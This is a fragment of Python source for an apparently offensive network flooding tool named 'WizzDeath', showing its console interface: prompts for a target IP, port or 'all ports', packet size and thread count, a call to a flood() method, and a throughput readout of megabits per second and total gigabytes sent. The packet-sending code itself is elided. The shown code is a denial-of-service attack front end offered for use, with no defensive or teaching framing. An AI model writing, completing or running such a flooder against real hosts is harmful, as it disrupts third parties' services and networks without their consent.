    ...
    def info(self):
        ...
        while self.on:
            ...
            if size != 0:
                ...
                print(stage(f"{fluo}{round(size)} {white}Mb/s {white}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb. {' '*20}"), end='\r')
...
def init():
    System.Size(140, 40)                                                                                                                                                                                                                                                                   ,System.Title(".W.i.z.z.D.e.a.t.h. ".replace('.',''))
    Cursor.HideCursor()
...
def main():
    ...
    ip = input(stage(f"Enter the IP to WizzDeath {white}->{fluo2} ", '?'))
    print()
    ...
    port = input(stage(f"Enter port {white}[{white}press {fluo2}enter{white} to attack all ports{white}] {white}->{fluo2} ", '?'))
    print()
    ...
    force = input(stage(f"Bytes per packet {white}[{white}press {fluo2}enter{white} for 1250{white}] {white}->{fluo2} ", '?'))
    print()
    ...
    threads = input(stage(f"Threads {white}[{white}press {fluo2}enter{white} for 100{white}] {white}->{fluo2} ", '?'))
    print()
    ...
    print()
    cport = '' if port is None else f'{white}:{fluo2}{port}'
    print(stage(f"Starting attack on {fluo2}{ip}{cport}{white}."), end='\r')


    brute = WizzDeath(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
    ...
    try:
        ...
        brute.stop()
        print(stage(f"Attack stopped. {fluo2}{ip}{cport}{white} was WizzDeathd with {fluo}{round(brute.total, 1)} {white}Gb.", '.'))
    print('\n')
    sleep(1)
